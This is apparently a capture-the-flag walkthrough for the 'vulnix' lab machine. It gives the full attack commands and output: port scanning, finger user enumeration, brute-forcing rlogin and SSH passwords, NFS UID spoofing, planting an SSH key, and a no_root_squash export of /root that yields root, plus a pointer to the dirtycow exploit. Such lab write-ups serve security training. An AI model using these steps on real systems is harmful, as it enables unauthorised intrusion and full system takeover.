***Source: 10.0.0.16***

## ***NMAP***

    # nmap -sS -T4 -p- 10.0.0.16

    PORT      STATE SERVICE
    22/tcp    open  ssh
    25/tcp    open  smtp
    79/tcp    open  finger
    110/tcp   open  pop3
    111/tcp   open  rpcbind
    143/tcp   open  imap
    512/tcp   open  exec
    513/tcp   open  login
    514/tcp   open  shell
    993/tcp   open  imaps
    995/tcp   open  pop3s
    2049/tcp  open  nfs
    35002/tcp open  rt-sound
    40791/tcp open  unknown
    46589/tcp open  unknown
    52174/tcp open  unknown
    54563/tcp open  unknown

## ***FINGER***

    # msfconsle

    msf6 > use auxiliary/scanner/finger/finger_users

    msf6 auxiliary(scanner/finger/finger_users) > show options

    Module options (auxiliary/scanner/finger/finger_users):

    Name        Current Setting               Required  Description
    ----        ---------------               --------  -----------
    RHOSTS       10.0.0.16                    yes       The target host(s), see https://github.com/rapid7
                                                        /metasploit-framework/wiki/Using-Metasploit
    RPORT       79                            yes       The target port (TCP)
    THREADS     1                             yes       The number of concurrent threads (max one per hos
                                                        t)
    USERS_FILE  /usr/share/metasploit-framew  yes       The file that contains a list of default UNIX acc
                ork/data/wordlists/unix_user            ounts.
                s.txt

    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: backup
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: bin
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: daemon
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: games
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: gnats
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: irc
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: landscape
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: libuuid
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: list
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: lp
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: mail
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: dovecot
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: man
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: messagebus
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: news
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: nobody
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: postfix
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: proxy
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: root
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: sshd
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: sync
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: sys
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: syslog
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: user
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: dovenull
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: uucp
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: whoopsie
    [+] 10.0.0.16:79          - 10.0.0.16:79 - Found user: www-data

Possible logins: SSH, exec (512), rlogin(513), 

Brute forcing the rlogin service.

[513][rlogin] host: 10.0.0.16   login: root   password: 147852

## ***SSH***

Brute forcing using the user 'user'.

    # hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.16 -IV

    [22][ssh] target 10.0.0.16 - login "user" - pass "letmein"

After logging in, going to the directory '/home' we find another user 'vulnix'.

    $ ls -l

    drwxr-x---  3 user   user   4096 Apr  7 21:19 user
    drwxr-x---  2 vulnix vulnix 4096 Sep  2  2012 vulnix


We don't have permission to log into the directory.
Let's try to find SUID files on the machine.

    $ find / -perm /4000 2> /dev/null

    /sbin/mount.nfs
    /usr/sbin/uuidd
    /usr/sbin/pppd
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/openssh/ssh-keysign
    /usr/lib/pt_chown
    /usr/bin/mtr
    /usr/bin/sudo
    /usr/bin/newgrp
    /usr/bin/passwd
    /usr/bin/chfn
    /usr/bin/at
    /usr/bin/sudoedit
    /usr/bin/traceroute6.iputils
    /usr/bin/gpasswd
    /usr/bin/chsh
    /usr/bin/procmail
    /bin/ping6
    /bin/mount
    /bin/umount
    /bin/su
    /bin/ping
    /bin/fusermount

Possible solution:

Get access to the user 'vulnix' because it's user has an nfs share. After that link that share on our local machine and upload file in order to exploit and gain root shell.

    Local Machine:

    showmount -e 10.0.0.16
    Export list for 10.0.0.16:
    /home/vulnix *

    # mount -t nfs 10.0.0.16:/home/vulnix /tmp/vulnix/
    # cd /tmp/vulnix/
    cd: Permission denied: “/tmp/vulnix/”

After mounting the share on our local machine, we don't have access to it. We can bypass that by adding the user 'vulnix' with the same uid to our local machine.
The user 'vulnix' has the uid 2008. 

    useradd -u 2008 vulnix
    # su vulnix 
    $ id -a
    uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)

We now have access to the share.

In order to login into the remote machine as the user 'vulnix', we can create an .ssh directory and add our public ssh key to the 'authorized_hosts' file, after that we can login into the machine as the user 'vulnix'.

    $ pwd
    /tmp/vulnix

    $ mkdir .ssh
    $ touch .ssh/authorized_keys
    $ chmod 644 .ssh/authorized_keys
    $ cat ~/.ssh/id_rsa.pub > .ssh/authorized_keys

>

    # ssh vulnix@10.0.0.16
    $ id -a
    uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)

>

     $ sudo -ll

    Matching 'Defaults' entries for vulnix on this host:
        env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User vulnix may run the following commands on this host:

    Sudoers entry:
        RunAsUsers: root
        Commands:
            sudoedit /etc/exports
        RunAsUsers: root
        Commands:
            NOPASSWD: sudoedit /etc/exports

### ***OPTION 1:*** 
By being able to edit the /etc/exports file we are able to add the /root folder as a share.

    $ sudoedit /etc/exports

    /root *(rw,no_root_squash)

After mounting it to our local machine we are able to do the same thing we did with the user 'vulnix'. After adding our public key to the authorized_keys file we are able to login as the root user and read the final flag.

    # cat /root/trophy.txt 
    cc614640424f5bd60ce5d5264899c3be


### ***OPTION 2: (NOT FUN!!!)***
Downloading the dirtycow exploit from https://www.exploit-db.com/exploits/40839, and running it on the remote machine.